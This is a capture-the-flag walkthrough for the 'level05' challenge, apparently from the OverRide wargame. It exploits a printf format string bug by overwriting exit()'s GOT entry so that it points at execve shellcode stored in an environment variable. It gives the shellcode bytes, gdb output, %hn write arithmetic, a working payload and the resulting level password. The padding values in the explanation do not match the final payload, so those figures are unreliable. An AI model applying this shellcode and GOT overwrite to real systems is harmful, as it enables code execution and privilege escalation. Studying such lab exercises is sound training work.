#level05

we start insvestigating the binary we found that it use the function printf() to print the argument with a format string.

```bash
   0x08048500 <+188>:	lea    eax,[esp+0x28]
   0x08048504 <+192>:	mov    DWORD PTR [esp],eax
   0x08048507 <+195>:	call   0x8048340 <printf@plt>
```

```bash
AAAA %x %x %x %X %x %x %x %x %X %x %x %x %x %X %x
aaaa 64 f7fcfac0 f7ec3af9 ffffd6bf ffffd6be 0 ffffffff ffffd744 f7fdb000 61616161 20782520 25207825 78252078 20782520 25207825
```

By utilizing the format string vulnerability, we have the ability to both read and write to the stack. This enables us to overwrite the address of the exit() function with a shellcode's address that we store in an environment variable.

```bash
export SHELLCODE=$(python -c 'print "\x90"*100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')
```

let find the adress of the shellcode in the stack

```bash
(gdb) x/2s *((char **)environ)
0xffffd83d:	 "SHELLCODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220j\vX\231Rh//shh/bin\211\343\061\311̀"
0xffffd8c1:	 "TERM=xterm-256color"
(gdb) x/2s 0xffffd83d+20
0xffffd851:	 "\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220j\vX\231Rh//shh/bin\211\343\061\311̀"
0xffffd8c1:	 "TERM=xterm-256color"
```

To proceed, we need to determine the address of the exit() function in the Global Offset Table (GOT). We can achieve this by disassembling the main() function and subsequently examining the disassembly of the exit() function. After analysis, we find that the address of the exit() function in the GOT is 0x80497e0.

Additionally, in the stack, we have already stored the address 0xffffd851, which points to the location of our shellcode.

```bash
0x08048513 <+207>:	call   0x8048370 <exit@plt>
End of assembler dump.
(gdb) disas 0x8048370
Dump of assembler code for function exit@plt:
   0x08048370 <+0>:	jmp    DWORD PTR ds:0x80497e0
   0x08048376 <+6>:	push   0x18
   0x0804837b <+11>:	jmp    0x8048330
End of assembler dump.
(gdb) x/wx 0x80497e0
0x80497e0 <exit@got.plt>:	0x08048376
```

Instead of writing the decimal value 4, we want to write the hexadecimal value 0xffffd851. However, there are two issues with directly writing this value. Firstly, writing 4 characters as input means writing "4" at a specific memory address. To write 0xffffd851, we would need to write 4294957137 (0xffffd851 in decimal) characters, which is practically impossible.

To overcome this, we can use a trick. The format we'll use is "AAAA%<value-4>x%7$n" (where value-4 is used because we have already written 4 bytes, represented by AAAA). For example, if we use "AAAA%96x%7$n," it will write the value 100 at the address 0x41414141. This works because "%100x" pads the argument with 100 bytes, which are spaces by default.

The second issue is that we don't want to write a long integer (4 bytes) directly because writing 4294957137 (the length of the value) characters to the standard output would take forever. Instead, we'll write two short integers (2 bytes) using the "%hn" specifier.

Let's break down the steps:

We want to write the value 0xffffd851, which means 0xffff (65535 in decimal) in the high-order bytes and 0xd851 (55377 in decimal) in the low-order bytes.
We want to write these values at memory address 0x80497e0. So, we write 0xffff at address 0x80497e0 + 2 (high-order) and 0xd851 at address 0x80497e0 (low-order).
To determine the value to set for padding, we use the formula: [The value we want] - [The bytes already written] = [The value to set].
Let's start with the low-order bytes:
Value to set = 55377 - 8 (because we have already written 8 bytes) = 55369.

Now, the high-order bytes:
Value to set = 65535 - 55377 (because we have already written 55377 bytes) = 10158.

Now we can construct the exploit as follows:
\x08\x04\x97\xe0"[::-1]+"\x08\x04\x97\xe2"[::-1]+ "%55369x%10$hn%10158x%11$hn"

Here's the breakdown:

`"\x08\x04\x97\xe0"[::-1]+"\x08\x04\x97\xe2"[::-1]` represents the addresses in reverse order (0x80497e0 and 0x80497e2).

`"%55369x%10$hn"` will write 55369 bytes to the standard output, which corresponds to the low-order bytes at the first address (0xffffd851).

`"%10158x%11$hn"` will write 10158 bytes to the standard output, which corresponds to the high-order bytes at the second address (0xffffd851).

This exploit takes advantage of these calculations to write the desired values at the specified memory addresses.

0xffff is 65535 heigh order bits
0xd851 is 55377 low order bits

the 10th argument where we can write

got of exit() = 0x80497e0 0x80497e2


```bash
level05@OverRide:~$ python -c 'print "\x08\x04\x97\xe0"[::-1]+"\x08\x04\x97\xe2"[::-1]+ "%57144x%10$hn%8383x%11$hn"'>exploit
level05@OverRide:~$ (cat exploit;cat) | ./level05
whoami
level06
cd ../level06
cat .pass
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
```
